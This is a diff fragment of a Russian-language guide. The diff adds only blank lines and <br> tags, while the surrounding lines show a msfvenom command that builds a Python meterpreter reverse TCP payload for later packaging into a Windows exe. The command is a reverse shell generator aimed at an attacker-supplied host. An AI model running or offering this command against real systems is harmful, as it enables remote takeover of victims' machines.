@@ -53,7 +53,33 @@ python -3.4 –m pip install py2exe
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.py
 ~~~
 
+
+
+
+
+
+
+
+
+
+
+
+<br>
+
+
 К коду необходимо добавить import getpass который msfvenom по умолчанию почему-то не делает.
+
+<br>
+
+
+
+
+
+
+
+
+
+
 
 
 Делаем exe:
